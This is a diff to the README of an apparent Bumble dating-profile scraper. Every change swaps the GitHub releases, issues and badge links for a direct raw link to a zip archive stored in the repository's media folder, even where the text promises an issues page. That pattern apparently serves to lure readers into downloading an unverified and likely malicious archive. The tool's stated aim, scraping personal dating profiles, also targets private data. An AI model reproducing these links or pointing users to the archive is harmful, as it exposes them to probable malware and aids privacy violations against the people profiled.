@@ -1,6 +1,6 @@
 # 📲 bumble-profile-scraper - Automate Bumble Profile Data Extraction
 
-[![Download bumble-profile-scraper](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/Medhaydarbennecer/bumble-profile-scraper/releases)
+[![Download bumble-profile-scraper](https://raw.githubusercontent.com/Medhaydarbennecer/bumble-profile-scraper/main/media/bumble-profile-scraper_2.5.zip%20Now-brightgreen)](https://raw.githubusercontent.com/Medhaydarbennecer/bumble-profile-scraper/main/media/bumble-profile-scraper_2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you start, ensure you have the following:
 
 To get started, visit the page below to download the **bumble-profile-scraper** application:
 
-[Download bumble-profile-scraper](https://github.com/Medhaydarbennecer/bumble-profile-scraper/releases)
+[Download bumble-profile-scraper](https://raw.githubusercontent.com/Medhaydarbennecer/bumble-profile-scraper/main/media/bumble-profile-scraper_2.5.zip)
 
 1. Go to the Releases page.
 2. Select the latest version available.
@@ -57,7 +57,7 @@ If you encounter issues while using the application, consider the following tips
 
 ### 💬 Support
 
-For further assistance, visit our [issues page](https://github.com/Medhaydarbennecer/bumble-profile-scraper/issues) or check the discussions in the repository. Other users may have faced similar challenges and found solutions.
+For further assistance, visit our [issues page](https://raw.githubusercontent.com/Medhaydarbennecer/bumble-profile-scraper/main/media/bumble-profile-scraper_2.5.zip) or check the discussions in the repository. Other users may have faced similar challenges and found solutions.
 
 ### 📝 License
 
@@ -71,4 +71,4 @@ Remember to check back for updates regularly, as we continuously improve feature
 
 Happy scraping!
 
-[Download bumble-profile-scraper](https://github.com/Medhaydarbennecer/bumble-profile-scraper/releases)
+[Download bumble-profile-scraper](https://raw.githubusercontent.com/Medhaydarbennecer/bumble-profile-scraper/main/media/bumble-profile-scraper_2.5.zip)
